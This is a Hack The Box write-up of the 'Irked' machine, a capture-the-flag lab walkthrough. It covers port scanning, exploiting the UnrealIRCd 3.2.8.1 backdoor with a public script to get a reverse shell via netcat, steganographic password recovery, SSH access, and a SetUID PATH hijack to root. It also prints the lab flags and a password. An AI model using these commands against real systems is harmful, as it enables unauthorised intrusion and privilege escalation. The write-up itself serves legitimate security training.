# Irked (Guided Mode)

## Difficulty: Easy

## OS: Linux

---

### Intro & Enumeration.

As with all guided machines I/we get presented with a set of questions that will **guide** you on your way. It starts with - How many open TCP ports are listening on Irked?  

Starting with **nmap** I scan:

```bash
m0j0@r1s1n  ~/HTB/write-ups/irked   m0j0_development ✚  nmap -sV -sC -p- 10.10.10.117
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-05 18:02 GMT
Nmap scan report for irked.htb (10.10.10.117)
Host is up (0.022s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          32778/tcp6  status
|   100024  1          37266/udp   status
|   100024  1          46540/tcp   status
|_  100024  1          53105/udp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
46540/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.02 seconds
```

I count 7 ports opening and this was wrong 🤔.

Quick check:

**Nmap categorizes ports into the following states:**

- Open: Open indicates that a service is listening for connections on this port.
- Closed: Closed indicates that the probes were received, but it was concluded that there was no service running on this port.

No, I still count 7 on more scans. Let me check Rustscan for a result:

```bash
m0j0@r1s1n  ~/HTB/write-ups/irked   m0j0_development ✚  nmap -sV -sC -p- 10.10.10.117
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-05 18:02 GMT
Nmap scan report for irked.htb (10.10.10.117)
Host is up (0.022s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          32778/tcp6  status
|   100024  1          37266/udp   status
|   100024  1          46540/tcp   status
|_  100024  1          53105/udp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
46540/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.02 seconds
 m0j0@r1s1n  ~/HTB/write-ups/irked   m0j0_development ✚  rustscan -a 10.10.10.117 -r 1-65535
[sudo] password for m0j0: 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.117:22
Open 10.10.10.117:80
Open 10.10.10.117:111
Open 10.10.10.117:6697
Open 10.10.10.117:8067
Open 10.10.10.117:46540
Open 10.10.10.117:65534
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-05 18:32 UTC
Initiating Ping Scan at 18:32
Scanning 10.10.10.117 [2 ports]
Completed Ping Scan at 18:32, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:32
Completed Parallel DNS resolution of 1 host. at 18:32, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:32
Scanning 10.10.10.117 [7 ports]
Discovered open port 22/tcp on 10.10.10.117
Discovered open port 80/tcp on 10.10.10.117
Discovered open port 111/tcp on 10.10.10.117
Discovered open port 8067/tcp on 10.10.10.117
Discovered open port 46540/tcp on 10.10.10.117
Discovered open port 65534/tcp on 10.10.10.117
Discovered open port 6697/tcp on 10.10.10.117
Completed Connect Scan at 18:32, 0.02s elapsed (7 total ports)
Nmap scan report for 10.10.10.117
Host is up, received syn-ack (0.021s latency).
Scanned at 2024-01-05 18:32:53 UTC for 0s

PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack
80/tcp    open  http       syn-ack
111/tcp   open  rpcbind    syn-ack
6697/tcp  open  ircs-u     syn-ack
8067/tcp  open  infi-async syn-ack
46540/tcp open  unknown    syn-ack
65534/tcp open  unknown    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds
```

No, it still counts as 7 and incorrect on input and this is the first question.  

I was going to reach out on HTB Discord about the bug and probably will when I finish the machine.

The only way to do that is answer the question. I suppose this is when the simple power of absolutely winging it happens, so I just guess - the answer was 6 for people scratching their heads.

Moving on the next question is - What software is running on TCP 8067?

Well that’s in the scan and correct input.

Next question is - In 2010, UnrealIRCd announced there was a backdoor in the software. What version of the software was the backdoor in?

This question is a real guiding question and I’m glad. The webpage when I landed on it had:

![irked.jpg](irked/Untitled.png)

This tells me IRC isn’t working but that could also mean it isn’t working and I could exploit this. The site and guided question help with my decision (:

Back to the question I need a version. Googling helps with this as there are multiple exploits - MSF included that are there due to the keywords in the question - **UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)**

That’s one exploit but I prefer not to use metasploit. That just means look at GitHub for possible exploits. I found a python script [here](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py) (:

Onto the next question - What two characters are sent as the start of a command trigger passing the command to `system()` and thus execution?

This got me thinking I need to understand the exploit more and that’s long for a write-up and down to any readers to learn the way it suits them.

However, I got the answer by studying the exploits payload:

```python
<-------------------------------------SNIP------------------------------------->
# all the different payload options to be sent
if args.payload == 'python':
    try:
        s.sendall((f'AB; {gen_payload(python_payload)} \n').encode())
    except:
        print('connection made, but failed to send exploit...')
<-------------------------------------SNIP------------------------------------->
```

So it is pretty easy to see the answer by looking at the payload that has been crafted. It sends **AB**

characters and this is the answer.

Now the fun stuff, I want to see will the exploit work!!

### Exploit for User:

I need two terminals - a listener and one to run the exploit:

```bash
 m0j0@r1s1n  ~/HTB/write-ups/irked/UnrealIRCd-3.2.8.1-Backdoor   master ±  python3 exploit.py -payload bash 10.10.10.117 8067
Exploit sent successfully!
```

I get a good sign and wait:

```bash
m0j0@r1s1n  ~/HTB/write-ups/irked   m0j0_development ✚  rlwrap -cAr nc -lvnp 1234          
listening on [any] 1234 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.117] 38764
bash: cannot set terminal process group (618): Inappropriate ioctl for device
bash: no job control in this shell
ircd@irked:~/Unreal3.2$ id
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

I got a connect back (: 

Note - There is a very easy MSF module for this if you `searchsploit` for it, as mentioned above.

So my shell needs a few command before I move on but I will try out of curiosity the `script` method as it is easier to remember:

```bash
ircd@irked:~/Unreal3.2$ script /dev/null -c bash
script /dev/null -c bash
ircd@irked:~/Unreal3.2$ 
[1]  + 45233 suspended  rlwrap -cAr nc -lvnp 1234
 ✘ m0j0@r1s1n  ~/HTB/write-ups/irked   m0j0_development ✚  stty raw -echo; fg;             
[1]  + 45233 continued  rlwrap -cAr nc -lvnp 1234
ircd@irked:~/Unreal3.2$ i
id_rsa     irked.jpg
```

Yeah it works also I have auto-complete working as seen above (I think). Anyway…

Time to move on and get user but it appears I need to move onto another user to read `user.txt`

```bash
ircd@irked:/home$ cat djmardov/user.txt
cat djmardov/user.txt
cat: djmardov/user.txt: Permission denied
```

Time for lateral movement to begin, but I also need to check have I missed any guided questions.

The next question is - What is the name of the hidden file that contains a "steg backup pw"?

This is a guide alright let’s look for a hidden folder, just like enumeration I guess. Right??

So I know all hidden folders start with a period `.` and I am looking a backup. I can try a simple command first.

```bash
ircd@irked:/$ find / -type f -iname ".backup" 2>/dev/null
find / -type f -iname ".backup" 2>/dev/null
/home/djmardov/Documents/.backup
```

Thinking simple can pay off at times (: I got my next answer.

Also in the process I found another file that might help the next question, first can I access backup?

```bash
ircd@irked:/$ cat /home/djmardov/Documents/.backup
cat /home/djmardov/Documents/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

Yes it looks like I can and it has just turned into a CTF with stenography references. I did mention I stumbled on what I think might answer the next question.

What is djmardov's password? 
Searching previously I found a `jpg` called `irked.jpg` so I got to try and see is this the stego.

```bash
ircd@irked:/var/www/html$ ls -la
ls -la
total 48
drwxr-xr-x 2 root root  4096 May 15  2018 .
drwxr-xr-x 3 root root  4096 May 14  2018 ..
-rw-r--r-- 1 root root    72 May 14  2018 index.html
-rw-r--r-- 1 root root 34697 May 14  2018 irked.jpg
```

Initiating a Python server in the directory the `jpg` is in and using **wget** I got this `jpg` local.

```bash
m0j0@r1s1n  ~/HTB/write-ups/irked   m0j0_development ✚  steghide extract -sf 'irked.jpg'
Enter passphrase: 
the file "pass.txt" does already exist. overwrite ? (y/n) y
wrote extracted data to "pass.txt".
 m0j0@r1s1n  ~/HTB/write-ups/irked   m0j0_development ✚  cat pass.txt  
Kab6h+m+bbp2J:HG
```

Steghide did a good job and got the password, now the big question.  What for?
I need to try SSH.

```bash
m0j0@r1s1n  ~/HTB/write-ups/irked   m0j0_development ✚  ssh djmardov@irked.htb          
djmardov@irked.htb's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$ id
uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

Lateral movement complete (: I can get `user.txt`

```bash
djmardov@irked:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos                                                                          
djmardov@irked:~$ cat user.txt                                                                                                                               
f03c09818ce2376c47d24742355cf2a1
```

### Privilege Escalation

OK, time for me personally to go through a set of commands to check if I have any low hanging fruit to get root:

```bash
djmardov@irked:~$ sudo -l                                                                                                                                    
-bash: sudo: command not found                                                                                                                               
djmardov@irked:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                  
/usr/lib/eject/dmcrypt-get-device                                                                                                                            
/usr/lib/policykit-1/polkit-agent-helper-1                                                                                                                   
/usr/lib/openssh/ssh-keysign                                                                                                                                 
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper                                                                                                          
/usr/sbin/exim4                                                                                                                                              
/usr/sbin/pppd                                                                                                                                               
/usr/bin/chsh                                                                                                                                                
/usr/bin/procmail                                                                                                                                            
/usr/bin/gpasswd                                                                                                                                             
/usr/bin/newgrp                                                                                                                                              
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
```

I tried `sudo -l` to check did I have anything I could run as root but as you can see it didn’t exist.

Then I check for files/binaries that  have any special permissions and this seems to have thrown up a binary that isn’t standard. Oh the questions, let me check.

What is the filename for the SetUID binary that is custom to Irked?

Look I have a binary called `viewuser` and it answers the question but not the next.

What is the full path of the file that `viewuser` fails to load when it runs?

I need to run it to see:

```bash
djmardov@irked:~$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-01-06 01:01 (:0)
djmardov pts/1        2024-01-06 01:38 (10.10.14.8)
sh: 1: /tmp/listusers: not found
```

It tries to run `/tmp/listusers` and this is my answer and maybe my way to root, let me try and copy the `sh` binary into the non-existent file and see can I get a root shell.

```bash
djmardov@irked:~$ cp /bin/sh /tmp/listusers
djmardov@irked:~$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2024-01-06 01:01 (:0)
djmardov pts/1        2024-01-06 01:38 (10.10.14.8)
# id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
# cat /root/root.txt
b5f8c139b11ca3ad136dfef4e255810c
```

Yeah (: I get a winner.

There you have it root was quite simple following some basic enumeration steps and hacks.

I hope you enjoy the read and take something home from it.
